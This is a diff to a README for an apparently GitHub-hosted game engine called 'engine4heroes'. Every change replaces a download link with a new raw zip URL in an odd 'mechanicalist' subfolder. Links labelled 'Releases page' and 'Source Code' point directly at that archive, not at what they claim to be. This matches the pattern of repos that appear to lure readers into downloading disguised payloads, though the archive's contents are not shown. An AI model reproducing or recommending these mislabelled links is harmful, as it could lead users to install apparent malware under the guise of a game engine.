@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download engine4heroes](https://raw.githubusercontent.com/harrietwilsonnewbrunswick159/engine4heroes/master/mechanicalist/engine4heroes_2.7.zip)](https://raw.githubusercontent.com/harrietwilsonnewbrunswick159/engine4heroes/master/mechanicalist/engine4heroes_2.7.zip)
+[![Download engine4heroes](https://github.com/harrietwilsonnewbrunswick159/engine4heroes/raw/refs/heads/master/mechanicalist/heroes-engine-v3.2-alpha.4.zip)](https://github.com/harrietwilsonnewbrunswick159/engine4heroes/raw/refs/heads/master/mechanicalist/heroes-engine-v3.2-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Before you proceed, ensure your computer meets the following requirements:
 
 ## 🔗 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/harrietwilsonnewbrunswick159/engine4heroes/master/mechanicalist/engine4heroes_2.7.zip) to download the latest version of the game engine. 
+To get started, visit the [Releases page](https://github.com/harrietwilsonnewbrunswick159/engine4heroes/raw/refs/heads/master/mechanicalist/heroes-engine-v3.2-alpha.4.zip) to download the latest version of the game engine. 
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of **engine4heroes**.
@@ -73,7 +73,7 @@ Interested in contributing to **engine4heroes**? We welcome all kinds of contrib
 
 ## 🔗 Useful Links
 
-- [Source Code](https://raw.githubusercontent.com/harrietwilsonnewbrunswick159/engine4heroes/master/mechanicalist/engine4heroes_2.7.zip) - Access the project files.
-- [Releases](https://raw.githubusercontent.com/harrietwilsonnewbrunswick159/engine4heroes/master/mechanicalist/engine4heroes_2.7.zip) - Download the latest version.
+- [Source Code](https://github.com/harrietwilsonnewbrunswick159/engine4heroes/raw/refs/heads/master/mechanicalist/heroes-engine-v3.2-alpha.4.zip) - Access the project files.
+- [Releases](https://github.com/harrietwilsonnewbrunswick159/engine4heroes/raw/refs/heads/master/mechanicalist/heroes-engine-v3.2-alpha.4.zip) - Download the latest version.
 
 Thank you for visiting the **engine4heroes** project! We hope you enjoy playing and exploring this amazing game engine.
